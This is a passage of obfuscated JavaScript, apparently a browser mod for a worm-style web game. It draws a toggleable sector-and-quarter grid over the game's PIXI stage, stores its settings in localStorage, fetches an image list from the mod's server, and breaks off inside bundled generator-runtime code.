window.URLSERV_WORMUP = "https://wormup.in";
window.sectorSystem = {
  settings: {
    lineWidth: 0.15,
    lineColor: 16711680,
    lineAlpha: 0.3,
    backgroundColor: 0,
    backgroundAlpha: 0.6,
    sectorTextStyle: {
      fontFamily: "Arial",
      fontSize: 14,
      fill: 16777215
    },
    quarterTextStyle: {
      fontFamily: "Arial",
      fontSize: 20,
      fill: 16777215
    },
    showLines: true
  },
  state: {
    container: null,
    graphics: null,
    isActive: true,
    currentMode: null,
    texts: [],
    initialized: false,
    renderContainer: null,
    restored: false
  },
  findRenderContainer: function () {
    if (this.state.renderContainer) {
      return this.state.renderContainer;
    }
    const _0x2e426d = [() => window.app?.stage, () => window.PIXI?.app?.stage, () => window.gameApp?.stage, () => window.renderer?.stage, () => window._wup?._anApp?.og?.af?.ng?.mf, () => window._1f8817?.og?.af?.ng?.mf, () => window.decoder?.og?.af?.ng?.mf, () => window.game?.renderer?.stage, () => window.game?.scene?.stage, () => {
      for (let _0x1f2783 in window) {
        try {
          const _0x2649e9 = window[_0x1f2783];
          if (_0x2649e9 && typeof _0x2649e9 === "object") {
            if (_0x2649e9 instanceof PIXI.Container) {
              return _0x2649e9;
            }
            if (_0x2649e9.stage instanceof PIXI.Container) {
              return _0x2649e9.stage;
            }
            if (_0x2649e9.mf instanceof PIXI.Container) {
              return _0x2649e9.mf;
            }
            if (_0x2649e9.og?.af?.ng?.mf instanceof PIXI.Container) {
              return _0x2649e9.og.af.ng.mf;
            }
          }
        } catch (_0x17bc8) {}
      }
      return null;
    }];
    for (let _0x54824a = 0; _0x54824a < _0x2e426d.length; _0x54824a++) {
      try {
        const _0x3b83dd = _0x2e426d[_0x54824a]();
        if (_0x3b83dd && _0x3b83dd instanceof PIXI.Container) {
          this.state.renderContainer = _0x3b83dd;
          return _0x3b83dd;
        }
      } catch (_0x1a3e58) {}
    }
    return null;
  },
  getRadius: function () {
    const _0x3ddd15 = [() => window._wup?._anApp?.dh?.hh?.zg, () => window._1f8817?.dh?.hh?.zg, () => window.decoder?.dh?.hh?.zg, () => window.game?.radius, () => window.gameRadius, () => window.mapRadius, () => 500];
    for (let _0x7bd4f8 of _0x3ddd15) {
      try {
        const _0x18adc4 = _0x7bd4f8();
        if (_0x18adc4 && typeof _0x18adc4 === "number" && _0x18adc4 > 0) {
          return _0x18adc4;
        }
      } catch (_0x207b87) {}
    }
    return 500;
  },
  clearTexts: function () {
    this.state.texts.forEach(_0xe5938f => {
      if (_0xe5938f && _0xe5938f.parent) {
        _0xe5938f.parent.removeChild(_0xe5938f);
        try {
          _0xe5938f.destroy({
            children: true,
            texture: false,
            baseTexture: false
          });
        } catch (_0x3867bf) {}
      }
    });
    this.state.texts = [];
  },
  initDrawing: function (_0x3ab078) {
    this.clearTexts();
    this.state.graphics.clear();
    this.state.graphics.lineStyle(this.settings.lineWidth, this.settings.lineColor, this.settings.lineAlpha);
    this.state.graphics.beginFill(this.settings.backgroundColor, this.settings.backgroundAlpha);
    this.state.graphics.drawCircle(0, 0, _0x3ab078);
    this.state.graphics.endFill();
    return _0x3ab078;
  },
  drawSectors: function () {
    const _0x855910 = this.initDrawing(this.getRadius());
    const _0x24dec7 = _0x855910 / 3;
    if (this.settings.showLines) {
      for (let _0x11705a = 1; _0x11705a < 3; _0x11705a++) {
        this.state.graphics.drawCircle(0, 0, _0x855910 - _0x11705a * _0x24dec7);
      }
      for (let _0x265f4d = 0; _0x265f4d < 4; _0x265f4d++) {
        const _0x104929 = _0x265f4d * Math.PI / 2;
        this.state.graphics.moveTo(0, 0);
        this.state.graphics.lineTo(Math.cos(_0x104929) * _0x855910, Math.sin(_0x104929) * _0x855910);
      }
    }
    for (let _0x3c142b = 0; _0x3c142b < 4; _0x3c142b++) {
      const _0x153ccb = _0x3c142b * Math.PI / 2;
      for (let _0x2d2dea = 0; _0x2d2dea < 3; _0x2d2dea++) {
        const _0xb8a98b = _0x855910 - (_0x2d2dea * _0x24dec7 + _0x24dec7 / 2);
        const _0x488cb4 = _0x153ccb + Math.PI / 4;
        const _0xe31495 = ["S", "D", "F"][_0x2d2dea] + (_0x3c142b + 1);
        const _0x56ffe0 = new PIXI.Text(_0xe31495, this.settings.sectorTextStyle);
        _0x56ffe0.anchor.set(0.5);
        _0x56ffe0.position.set(Math.cos(_0x488cb4) * _0xb8a98b, Math.sin(_0x488cb4) * _0xb8a98b);
        this.state.container.addChild(_0x56ffe0);
        this.state.texts.push(_0x56ffe0);
      }
    }
  },
  drawQuarters: function () {
    const _0x42406b = this.initDrawing(this.getRadius());
    if (this.settings.showLines) {
      this.state.graphics.moveTo(-_0x42406b, 0);
      this.state.graphics.lineTo(_0x42406b, 0);
      this.state.graphics.moveTo(0, -_0x42406b);
      this.state.graphics.lineTo(0, _0x42406b);
    }
    [{
      n: "UP 1",
      x: 1,
      y: -1
    }, {
      n: "UP 2",
      x: -1,
      y: -1
    }, {
      n: "UP 3",
      x: -1,
      y: 1
    }, {
      n: "UP 4",
      x: 1,
      y: 1
    }].forEach(_0x3311eb => {
      const _0x4ed8e4 = new PIXI.Text(_0x3311eb.n, this.settings.quarterTextStyle);
      _0x4ed8e4.anchor.set(0.5);
      _0x4ed8e4.position.set(_0x3311eb.x * _0x42406b / 3, _0x3311eb.y * _0x42406b / 3);
      this.state.container.addChild(_0x4ed8e4);
      this.state.texts.push(_0x4ed8e4);
    });
  },
  initGraphics: function () {
    if (this.state.initialized) {
      return true;
    }
    const _0x2b3961 = this.findRenderContainer();
    if (!_0x2b3961) {
      return false;
    }
    try {
      this.state.container = new PIXI.Container();
      this.state.graphics = new PIXI.Graphics();
      this.state.container.addChild(this.state.graphics);
      _0x2b3961.addChild(this.state.container);
      if (this.state.container.zIndex !== undefined) {
        this.state.container.zIndex = 10;
      }
      this.state.container.visible = false;
      this.state.initialized = true;
      return true;
    } catch (_0x4bb6d0) {
      return false;
    }
  },
  toggleMode: function (_0x29d25a) {
    if (!this.initGraphics()) {
      return;
    }
    if (this.state.isActive && this.state.currentMode === _0x29d25a) {
      this.state.container.visible = false;
      this.state.isActive = false;
      this.state.currentMode = null;
      const _0x48c5ea = document.getElementById("sector_system_toggle");
      if (_0x48c5ea) {
        _0x48c5ea.checked = false;
      }
      this.saveSettings();
      return;
    }
    this.state.isActive = true;
    this.state.currentMode = _0x29d25a;
    this.state.container.visible = true;
    const _0x24f574 = document.getElementById("sector_system_toggle");
    if (_0x24f574) {
      _0x24f574.checked = true;
    }
    if (_0x29d25a === "sectors") {
      this.drawSectors();
    } else {
      this.drawQuarters();
    }
    this.saveSettings();
  },
  setupKeyboardEvents: function () {
    const _0x4c576b = _0x52ac7f => {
      const _0x1e45b7 = _0x52ac7f.keyCode || _0x52ac7f.which;
      const _0x1bfc98 = _0x52ac7f.key;
      if (_0x52ac7f.target.tagName === "INPUT" || _0x52ac7f.target.tagName === "TEXTAREA") {
        return;
      }
      if (_0x52ac7f.target.closest(".wup-modal, .wormup-container")) {
        return;
      }
      const _0x5e5238 = {
        83: () => this.toggleMode("sectors"),
        187: () => this.toggleMode("sectors"),
        61: () => this.toggleMode("sectors"),
        88: () => this.toggleMode("quarters")
      };
      if (_0x5e5238[_0x1e45b7]) {
        _0x52ac7f.preventDefault();
        _0x5e5238[_0x1e45b7]();
        if (typeof this.initUserInterface === "function") {
          this.initUserInterface();
        }
      }
    };
    document.addEventListener("keydown", _0x4c576b);
  },
  saveSettings: function () {
    try {
      const _0x2f2dc0 = {
        settings: this.settings,
        isActive: this.state.isActive,
        currentMode: this.state.currentMode
      };
      localStorage.setItem("sectorSystemSettings", JSON.stringify(_0x2f2dc0));
    } catch (_0xcc232) {}
  },
  loadSettings: function () {
    try {
      const _0x58c0fc = localStorage.getItem("sectorSystemSettings");
      if (_0x58c0fc) {
        const _0x5b833c = JSON.parse(_0x58c0fc);
        if (_0x5b833c.settings) {
          this.settings = {
            ...this.settings,
            ..._0x5b833c.settings
          };
        }
        this.savedState = {
          isActive: _0x5b833c.isActive || false,
          currentMode: _0x5b833c.currentMode || "sectors"
        };
      }
    } catch (_0x43ed8d) {}
  },
  applySettings: function () {
    if (this.state.isActive && this.state.currentMode) {
      if (this.state.currentMode === "sectors") {
        this.drawSectors();
      } else {
        this.drawQuarters();
      }
    }
  },
  init: function () {
    if (typeof PIXI === "undefined") {
      setTimeout(() => this.init(), 1000);
      return;
    }
    this.loadSettings();
    this.setupKeyboardEvents();
    const _0x172a64 = this.initGraphics();
    if (!_0x172a64) {
      setTimeout(() => this.init(), 1000);
      return;
    }
    setTimeout(() => {
      if (this.savedState && this.savedState.isActive) {
        this.state.isActive = true;
        this.state.currentMode = this.savedState.currentMode;
        this.state.container.visible = true;
        if (this.state.currentMode === "sectors") {
          this.drawSectors();
        } else {
          this.drawQuarters();
        }
        const _0x5d0859 = document.getElementById("sector_system_toggle");
        if (_0x5d0859) {
          _0x5d0859.checked = true;
        }
        this.state.restored = true;
      }
    }, 1000);
  },
  initUserInterface: function () {
    if (typeof $ === "undefined") {
      return;
    }
    function _0x2eadc1(_0x376527) {
      return "#" + _0x376527.toString(16).padStart(6, "0");
    }
    function _0x473a57(_0xaf1ea0) {
      return parseInt(_0xaf1ea0.replace("#", ""), 16);
    }
    if (!this.state.restored && this.savedState && this.savedState.isActive) {
      this.toggleMode(this.savedState.currentMode || "sectors");
      this.state.restored = true;
    }
    const _0x1f9c41 = () => {
      const _0x540b04 = $("#sector_system_toggle");
      if (_0x540b04.length) {
        _0x540b04.prop("checked", this.state.isActive);
      }
      const _0x2d9f6d = $("#sector_display_mode");
      if (_0x2d9f6d.length) {
        _0x2d9f6d.val(this.state.currentMode || "sectors");
      }
      const _0x3d5621 = $("#sector_bg_color");
      if (_0x3d5621.length) {
        _0x3d5621.val(_0x2eadc1(this.settings.backgroundColor));
      }
      const _0x26c897 = $("#sector_line_color");
      if (_0x26c897.length) {
        _0x26c897.val(_0x2eadc1(this.settings.lineColor));
      }
      const _0x4ab431 = $("#sector_bg_opacity");
      const _0x9d5ee5 = $("#sector_bg_opacity_value");
      if (_0x4ab431.length && _0x9d5ee5.length) {
        _0x4ab431.val(this.settings.backgroundAlpha * 100);
        _0x9d5ee5.text(Math.round(this.settings.backgroundAlpha * 100) + "%");
      }
      const _0x19af5b = $("#sector_line_opacity");
      const _0x1890c7 = $("#sector_line_opacity_value");
      if (_0x19af5b.length && _0x1890c7.length) {
        _0x19af5b.val(this.settings.lineAlpha * 100);
        _0x1890c7.text(Math.round(this.settings.lineAlpha * 100) + "%");
      }
      const _0x102f5c = $("#sector_show_lines");
      if (_0x102f5c.length) {
        _0x102f5c.prop("checked", this.settings.showLines);
      }
      const _0x47edc2 = $("#sector_settings_panel");
      if (_0x47edc2.length) {
        if (this.state.isActive) {
          _0x47edc2.slideDown(300);
        } else {
          _0x47edc2.slideUp(200);
        }
      }
      const _0x3b52e0 = $("#sector_lines_options");
      if (_0x3b52e0.length) {
        if (!this.settings.showLines) {
          _0x3b52e0.slideUp(200);
        } else {
          _0x3b52e0.slideDown(200);
        }
      }
    };
    $("#sector_system_toggle").off("change").on("change", _0x4b20cb => {
      const _0x2b2c3f = $(_0x4b20cb.target).prop("checked");
      if (_0x2b2c3f) {
        const _0x2950aa = $("#sector_display_mode").val() || "sectors";
        this.toggleMode(_0x2950aa);
      } else if (this.state.isActive) {
        this.toggleMode(this.state.currentMode);
      }
      _0x1f9c41();
    });
    $("#sector_display_mode").off("change").on("change", _0x2bc54b => {
      const _0x19e7b3 = $(_0x2bc54b.target).val();
      if (this.state.isActive) {
        this.toggleMode(this.state.currentMode);
        this.toggleMode(_0x19e7b3);
        _0x1f9c41();
      }
    });
    $("#sector_bg_color").off("change").on("change", _0x15dab2 => {
      this.settings.backgroundColor = _0x473a57($(_0x15dab2.target).val());
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_line_color").off("change").on("change", _0x4a3f1d => {
      this.settings.lineColor = _0x473a57($(_0x4a3f1d.target).val());
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_bg_opacity").off("input").on("input", _0x27d723 => {
      const _0x1b0fad = parseInt($(_0x27d723.target).val()) / 100;
      this.settings.backgroundAlpha = _0x1b0fad;
      $("#sector_bg_opacity_value").text(Math.round(_0x1b0fad * 100) + "%");
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_line_opacity").off("input").on("input", _0x5ef0f6 => {
      const _0x45e88b = parseInt($(_0x5ef0f6.target).val()) / 100;
      this.settings.lineAlpha = _0x45e88b;
      $("#sector_line_opacity_value").text(Math.round(_0x45e88b * 100) + "%");
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_show_lines").off("change").on("change", _0x5c34a7 => {
      this.settings.showLines = $(_0x5c34a7.target).prop("checked");
      const _0x113fa7 = $("#sector_lines_options");
      if (!this.settings.showLines) {
        _0x113fa7.slideUp(200);
      } else {
        _0x113fa7.slideDown(200);
      }
      this.applySettings();
      this.saveSettings();
    });
    _0x1f9c41();
  }
};
setTimeout(() => {
  if (window.sectorSystem && typeof window.sectorSystem.init === "function") {
    window.sectorSystem.init();
  }
}, 1000);
$(document).ready(function () {
  $(".sidebar-item[data-tab='backgrounds']").on("click", function () {
    if (window.sectorSystem && typeof window.sectorSystem.initUserInterface === "function") {
      setTimeout(() => window.sectorSystem.initUserInterface(), 100);
    }
  });
});
window.toggleSectors = () => window.sectorSystem?.toggleMode("sectors");
window.toggleQuarters = () => window.sectorSystem?.toggleMode("quarters");
window.debugSectors = () => window.sectorSystem?.debug();
var savedImages = null;
var savedImageVersion = localStorage.getItem("wupImageVersion");
var cachedImages = localStorage.getItem("wupImages");
if (cachedImages && savedImageVersion) {
  savedImages = cachedImages.split(",");
} else {
  fetch(window.URLSERV_WORMUP + "/store", {
    headers: {
      "Content-Type": "application/json"
    },
    method: "POST",
    body: JSON.stringify({
      img: "i2"
    })
  }).then(async function (_0x20df93) {
    var _0x1f24ad = await _0x20df93.json();
    savedImages = _0x1f24ad.i.split(".");
    localStorage.setItem("wupImages", savedImages.join(","));
    localStorage.setItem("wupImageVersion", _0x1f24ad.vs);
    window.location.reload();
  }).catch(function (_0x52cdb5) {
    console.error("فشل في تحميل الصور:", _0x52cdb5);
  });
}
(function () {
  'use strict';

  function _0x1965c9(_0x18ecc3, _0x2913c) {
    if (!(_0x18ecc3 instanceof _0x2913c)) {
      throw new TypeError("Cannot call a class as a function");
    }
  }
  function _0x307308(_0x2c285a, _0x21e882) {
    for (var _0x122d66 = 0; _0x122d66 < _0x21e882.length; _0x122d66++) {
      var _0x3a732f = _0x21e882[_0x122d66];
      _0x3a732f.enumerable = _0x3a732f.enumerable || false;
      _0x3a732f.configurable = true;
      if ("value" in _0x3a732f) {
        _0x3a732f.writable = true;
      }
      Object.defineProperty(_0x2c285a, _0x504780(_0x3a732f.key), _0x3a732f);
    }
  }
  function _0x16d9e2(_0x35464d, _0x42b791, _0x3855b3) {
    if (_0x42b791) {
      _0x307308(_0x35464d.prototype, _0x42b791);
    }
    if (_0x3855b3) {
      _0x307308(_0x35464d, _0x3855b3);
    }
    Object.defineProperty(_0x35464d, "prototype", {
      writable: false
    });
    return _0x35464d;
  }
  function _0x4e8c0d(_0x591b1e, _0x2f481b) {
    var _0xc6970f = Object.keys(_0x591b1e);
    if (Object.getOwnPropertySymbols) {
      var _0x4ef74b = Object.getOwnPropertySymbols(_0x591b1e);
      if (_0x2f481b) {
        _0x4ef74b = _0x4ef74b.filter(function (_0x393f4f) {
          return Object.getOwnPropertyDescriptor(_0x591b1e, _0x393f4f).enumerable;
        });
      }
      _0xc6970f.push.apply(_0xc6970f, _0x4ef74b);
    }
    return _0xc6970f;
  }
  function _0x3346cc(_0x2ffe02) {
    for (var _0x5b2427 = 1; _0x5b2427 < arguments.length; _0x5b2427++) {
      var _0x2a4c66 = arguments[_0x5b2427] ?? {};
      if (_0x5b2427 % 2) {
        _0x4e8c0d(Object(_0x2a4c66), true).forEach(function (_0x5910ed) {
          _0x13f8f6(_0x2ffe02, _0x5910ed, _0x2a4c66[_0x5910ed]);
        });
      } else if (Object.getOwnPropertyDescriptors) {
        Object.defineProperties(_0x2ffe02, Object.getOwnPropertyDescriptors(_0x2a4c66));
      } else {
        _0x4e8c0d(Object(_0x2a4c66)).forEach(function (_0x5de4a3) {
          Object.defineProperty(_0x2ffe02, _0x5de4a3, Object.getOwnPropertyDescriptor(_0x2a4c66, _0x5de4a3));
        });
      }
    }
    return _0x2ffe02;
  }
  function _0x13f8f6(_0x3a1e83, _0x839ede, _0x5841fd) {
    if ((_0x839ede = _0x504780(_0x839ede)) in _0x3a1e83) {
      Object.defineProperty(_0x3a1e83, _0x839ede, {
        value: _0x5841fd,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      _0x3a1e83[_0x839ede] = _0x5841fd;
    }
    return _0x3a1e83;
  }
  function _0x504780(_0x539dc4) {
    var _0x1524d5 = _0x5c8f7a(_0x539dc4, "string");
    if (_0x185438(_0x1524d5) == "symbol") {
      return _0x1524d5;
    } else {
      return _0x1524d5 + "";
    }
  }
  function _0x5c8f7a(_0x1fb9f4, _0x299f80) {
    if (_0x185438(_0x1fb9f4) != "object" || !_0x1fb9f4) {
      return _0x1fb9f4;
    }
    var _0x201860 = _0x1fb9f4[Symbol.toPrimitive];
    if (_0x201860 !== undefined) {
      var _0x50ea8d = _0x201860.call(_0x1fb9f4, _0x299f80 || "default");
      if (_0x185438(_0x50ea8d) != "object") {
        return _0x50ea8d;
      }
      throw new TypeError("@@toPrimitive must return a primitive value.");
    }
    return (_0x299f80 === "string" ? String : Number)(_0x1fb9f4);
  }
  function _0x22e5a4() {
    'use strict';

    _0x22e5a4 = function _0x330e3b() {
      return _0x4c1a43;
    };
    var _0x553584;
    var _0x4c1a43 = {};
    var _0x35ea90 = Object.prototype;
    var _0x2a84c4 = _0x35ea90.hasOwnProperty;
    var _0x2fbeef = Object.defineProperty || function (_0x3ad369, _0x6c4083, _0x58cec8) {
      _0x3ad369[_0x6c4083] = _0x58cec8.value;
    };
    var _0x403e98 = typeof Symbol == "function" ? Symbol : {};
    var _0x153888 = Symbol.iterator;
    var _0x31e23a = Symbol.asyncIterator;
    var _0xa932c8 = Symbol.toStringTag;
    function _0x239660(_0x2ec0aa, _0x141f76, _0x1c9078) {
      Object.defineProperty(_0x2ec0aa, _0x141f76, {
        value: _0x1c9078,
        enumerable: true,
        configurable: true,
        writable: true
      });
      return _0x2ec0aa[_0x141f76];
    }
    try {
      _0x239660({}, "");
    } catch (_0xf26fad) {
      _0x239660 = function _0x3d83db(_0x12307f, _0x3beace, _0x202bf0) {
        return _0x12307f[_0x3beace] = _0x202bf0;
      };
    }
    function _0x432b76(_0x18b94a, _0x53b1b5, _0x37b349, _0x5860f9) {
      var _0x1f4d2b = _0x53b1b5 && _0x53b1b5.prototype instanceof _0x5d7e00 ? _0x53b1b5 : _0x5d7e00;
      var _0x5b6242 = Object.create(_0x1f4d2b.prototype);
      var _0x4218fc = new _0x14c6f0(_0x5860f9 || []);
      _0x2fbeef(_0x5b6242, "_invoke", {
        value: _0x8bf62b(_0x18b94a, _0x37b349, _0x4218fc)
      });
      return _0x5b6242;
    }
    function _0x1a6616(_0x27857c, _0x58be37, _0x28fd4b) {
      try {
        return {
          type: "normal",
          arg: _0x27857c.call(_0x58be37, _0x28fd4b)
        };
      } catch (_0x2c9296) {
        return {
          type: "throw",
          arg: _0x2c9296
        };
      }
    }
    _0x4c1a43.wrap = _0x432b76;
    var _0x20a71e = "suspendedStart";
    var _0x136fca = "suspendedYield";
    var _0x206c4d = "executing";
    var _0x4d0cf9 = "completed";
    var _0x35c8a2 = {};
    function _0x5d7e00() {}
    function _0x107abe() {}
    function _0x19a503() {}
    var _0x23469f = {};
    _0x239660(_0x23469f, _0x153888, function () {
      return this;
    });
    var _0x2f5043 = Object.getPrototypeOf;
    var _0x3e62ff = _0x2f5043 && _0x2f5043(_0x2f5043(_0x352433([])));
    if (_0x3e62ff && _0x3e62ff !== _0x35ea90 && _0x2a84c4.call(_0x3e62ff, _0x153888)) {
      _0x23469f = _0x3e62ff;
    }
    var _0x4bf55d = _0x19a503.prototype = _0x5d7e00.prototype = Object.create(_0x23469f);
    function _0x2758d6(_0x284b2d) {
      ["next", "throw", "return"].forEach(function (_0x22c37e) {
        _0x239660(_0x284b2d, _0x22c37e, function (_0x2f206e) {
          return this._invoke(_0x22c37e, _0x2f206e);
        });
      });
    }
    function _0x2de767(_0x30ef3f, _0x4c2b47) {
      function _0x4cca93(_0x1d9c4a, _0x369417, _0x3c8e71, _0x1a1408) {
        var _0x2aaeef = _0x1a6616(_0x30ef3f[_0x1d9c4a], _0x30ef3f, _0x369417);
        if (_0x2aaeef.type !== "throw") {
          var _0x10b69d = _0x2aaeef.arg;
          var _0x1eb6c2 = _0x10b69d.value;
          if (_0x1eb6c2 && _0x185438(_0x1eb6c2) == "object" && _0x2a84c4.call(_0x1eb6c2, "__await")) {
            return _0x4c2b47.resolve(_0x1eb6c2.__await).then(function (_0x220cde) {
              _0x4cca93("next", _0x220cde, _0x3c8e71, _0x1a1408);
            }, function (_0x31102e) {
              _0x4cca93("throw", _0x31102e, _0x3c8e71, _0x1a1408);
            });
          } else {
            return _0x4c2b47.resolve(_0x1eb6c2).then(function (_0x527fab) {
              _0x10b69d.value = _0x527fab;
              _0x3c8e71(_0x10b69d);
            }, function (_0xb5902f) {
              return _0x4cca93("throw", _0xb5902f, _0x3c8e71, _0x1a1408);
            });
          }
        }
        _0x1a1408(_0x2aaeef.arg);
      }
      var _0x4a0de8;
      _0x2fbeef(this, "_invoke", {
        value: function _0x6f77b6(_0x103e08, _0x141caf) {
          function _0xcde3ed() {
            return new _0x4c2b47(function (_0x1d2fec, _0x265ddd) {
              _0x4cca93(_0x103e08, _0x141caf, _0x1d2fec, _0x265ddd);
            });
          }
          return _0x4a0de8 = _0x4a0de8 ? _0x4a0de8.then(_0xcde3ed, _0xcde3ed) : _0xcde3ed();
        }
      });
    }
    function _0x8bf62b(_0x2bf002, _0x5a75f0, _0x33de7a) {
      var _0x52c5bd = _0x20a71e;
      return function (_0x2a2b45, _0x1671d) {
        if (_0x52c5bd === _0x206c4d) {
          throw Error("Generator is currently executing");
        }
        if (_0x52c5bd === _0x4d0cf9) {
          if (_0x2a2b45 === "throw") {
            throw _0x1671d;
          }
          return {
            value: _0x553584,
            done: true
          };
        }
        _0x33de7a.method = _0x2a2b45;
        _0x33de7a.arg = _0x1671d;
        while (true) {
          var _0x497f19 = _0x33de7a.delegate;
          if (_0x497f19) {
            var _0xe2ee16 = _0x43f968(_0x497f19, _0x33de7a);
            if (_0xe2ee16) {
              if (_0xe2ee16 === _0x35c8a2) {
                continue;
              }
              return _0xe2ee16;
            }
          }
          if (_0x33de7a.method === "next") {
            _0x33de7a.sent = _0x33de7a._sent = _0x33de7a.arg;
          } else if (_0x33de7a.method === "throw") {
            if (_0x52c5bd === _0x20a71e) {
              _0x52c5bd = _0x4d0cf9;
              throw _0x33de7a.arg;
            }
            _0x33de7a.dispatchException(_0x33de7a.arg);
          } else if (_0x33de7a.method === "return") {
            _0x33de7a.abrupt("return", _0x33de7a.arg);
          }
          _0x52c5bd = _0x206c4d;
          var _0xacf7ef = _0x1a6616(_0x2bf002, _0x5a75f0, _0x33de7a);
          if (_0xacf7ef.type === "normal") {
            _0x52c5bd = _0x33de7a.done ? _0x4d0cf9 : _0x136fca;
            if (_0xacf7ef.arg === _0x35c8a2) {
              continue;
            }
            return {
              value: _0xacf7ef.arg,
              done: _0x33de7a.done
            };
          }
          if (_0xacf7ef.type === "throw") {
            _0x52c5bd = _0x4d0cf9;
            _0x33de7a.method = "throw";
            _0x33de7a.arg = _0xacf7ef.arg;
          }
        }
      };
    }
    function _0x43f968(_0x4decb7, _0x412839) {
      var _0x2056fc = _0x412839.method;
      var _0x3ba173 = _0x4decb7.iterator[_0x2056fc];
      if (_0x3ba173 === _0x553584) {
        _0x412839.delegate = null;
        if (_0x2056fc !== "throw" || !_0x4decb7.iterator.return || !(_0x412839.method = "return", _0x412839.arg = _0x553584, _0x43f968(_0x4decb7, _0x412839), _0x412839.method === "throw")) {
          if (_0x2056fc !== "return") {
            _0x412839.method = "throw";
            _0x412839.arg = new TypeError("Iterator missing required method: '" + _0x2056fc + "' method");
          }
        }
        return _0x35c8a2;
      }
      var _0x2e83a7 = _0x1a6616(_0x3ba173, _0x4decb7.iterator, _0x412839.arg);
      if (_0x2e83a7.type === "throw") {
        _0x412839.method = "throw";
        _0x412839.arg = _0x2e83a7.arg;
        _0x412839.delegate = null;
        return _0x35c8a2;
      }
      var _0x5af160 = _0x2e83a7.arg;
      if (_0x5af160) {
        if (_0x5af160.done) {
          _0x412839[_0x4decb7.resultName] = _0x5af160.value;
          _0x412839.next = _0x4decb7.nextLoc;
          if (_0x412839.method !== "return") {
            _0x412839.method = "next";
            _0x412839.arg = _0x553584;
          }
          _0x412839.delegate = null;
          return _0x35c8a2;
        } else {
          return _0x5af160;
        }
      } else {
        _0x412839.method = "throw";
        _0x412839.arg = new TypeError("Iterator result must be an object");
        _0x412839.delegate = null;
        return _0x35c8a2;
      }
    }
    function _0x2d2386(_0x4add01) {
      var _0x11cc07 = {
        tryLoc: _0x4add01[0]
      };
      if (1 in _0x4add01) {
        _0x11cc07.catchLoc = _0x4add01[1];
      }
      if (2 in _0x4add01) {
        _0x11cc07.finallyLoc = _0x4add01[2];
        _0x11cc07.afterLoc = _0x4add01[3];
      }
      this.tryEntries.push(_0x11cc07);
    }
    function _0x5ecadd(_0x4495f8) {
      var _0x233300 = _0x4495f8.completion || {};
      _0x233300.type = "normal";
      delete _0x233300.arg;
      _0x4495f8.completion = _0x233300;
    }
    function _0x14c6f0(_0x3c479c) {
      this.tryEntries = [{
        tryLoc: "root"
      }];
      _0x3c479c.forEach(_0x2d2386, this);
      this.reset(true);
    }
    function _0x352433(_0x47d7e6) {
      if (_0x47d7e6 || _0x47d7e6 === "") {
        var _0x34e670 = _0x47d7e6[_0x153888];
        if (_0x34e670) {
          return _0x34e670.call(_0x47d7e6);
        }
        if (typeof _0x47d7e6.next == "function") {
          return _0x47d7e6;
        }
        if (!isNaN(_0x47d7e6.length)) {
          var _0x59d022 = -1;
          var _0x1d007f = function _0x1dc90a() {
            while (++_0x59d022 < _0x47d7e6.length) {
              if (_0x2a84c4.call(_0x47d7e6, _0x59d022)) {
                _0x1dc90a.value = _0x47d7e6[_0x59d022];
                _0x1dc90a.done = false;
                return _0x1dc90a;
              }
            }
            _0x1dc90a.value = _0x553584;
            _0x1dc90a.done = true;
            return _0x1dc90a;
          };
          return _0x1d007f.next = _0x1d007f;
        }
      }
      throw new TypeError(_0x185438(_0x47d7e6) + " is not iterable");
    }
    _0x107abe.prototype = _0x19a503;
    _0x2fbeef(_0x4bf55d, "constructor", {
      value: _0x19a503,
      configurable: true
    });
    _0x2fbeef(_0x19a503, "constructor", {
      value: _0x107abe,
      configurable: true
    });
    _0x107abe.displayName = _0x239660(_0x19a503, _0xa932c8, "GeneratorFunction");
    _0x4c1a43.isGeneratorFunction = function (_0x86eb4) {
      var _0x4ae5bb = typeof _0x86eb4 == "function" && _0x86eb4.constructor;
      return !!_0x4ae5bb && (_0x4ae5bb === _0x107abe || (_0x4ae5bb.displayName || _0x4ae5bb.name) === "GeneratorFunction");
    };
    _0x4c1a43.mark = function (_0x5263ea) {
      if (Object.setPrototypeOf) {
        Object.setPrototypeOf(_0x5263ea, _0x19a503);
      } else {
        _0x5263ea.__proto__ = _0x19a503;
        _0x239660(_0x5263ea, _0xa932c8, "GeneratorFunction");
      }
      _0x5263ea.prototype = Object.create(_0x4bf55d);
      return _0x5263ea;
    };
    _0x4c1a43.awrap = function (_0x5b738a) {
      return {
        __await: _0x5b738a
      };
    };
    _0x2758d6(_0x2de767.prototype);
    _0x239660(_0x2de767.prototype, _0x31e23a, function () {
      return this;
    });
    _0x4c1a43.AsyncIterator = _0x2de767;
    _0x4c1a43.async = function (_0x28ac2e, _0x1d66ea, _0x3130e8, _0x598ee0, _0x2a969f = Promise) {
      var _0x42fa82 = new _0x2de767(_0x432b76(_0x28ac2e, _0x1d66ea, _0x3130e8, _0x598ee0), _0x2a969f);
      if (_0x4c1a43.isGeneratorFunction(_0x1d66ea)) {
        return _0x42fa82;
      } else {
        return _0x42fa82.next().then(function (_0x5d046c) {
          if (_0x5d046c.done) {
            return _0x5d046c.value;
          } else {
            return _0x42fa82.next();
          }
        });
      }
    };
    _0x2758d6(_0x4bf55d);
    _0x239660(_0x4bf55d, _0xa932c8, "Generator");
    _0x239660(_0x4bf55d, _0x153888, function () {
      return this;
    });
    _0x239660(_0x4bf55d, "toString", function () {
      return "[object Generator]";
    });
    _0x4c1a43.keys = function (_0x272443) {
      var _0x5200ad = Object(_0x272443);
      var _0x2102ed = [];
      for (var _0x296c44 in _0x5200ad) {
        _0x2102ed.push(_0x296c44);
      }
      _0x2102ed.reverse();
      return function _0x7bf65c() {
        while (_0x2102ed.length) {
          var _0xaf300 = _0x2102ed.pop();
          if (_0xaf300 in _0x5200ad) {
            _0x7bf65c.value = _0xaf300;
            _0x7bf65c.done = false;
            return _0x7bf65c;
          }
        }
        _0x7bf65c.done = true;
        return _0x7bf65c;
      };
    };
    _0x4c1a43.values = _0x352433;
    _0x14c6f0.prototype = {
      constructor: _0x14c6f0,
      reset: function _0x49d98b(_0x13d001) {
        this.prev = 0;
        this.next = 0;
        this.sent = this._sent = _0x553584;
        this.done = false;
        this.delegate = null;
        this.method = "next";
        this.arg = _0x553584;
        this.tryEntries.forEach(_0x5ecadd);
        if (!_0x13d001) {
          for (var _0x2fd285 in this) {
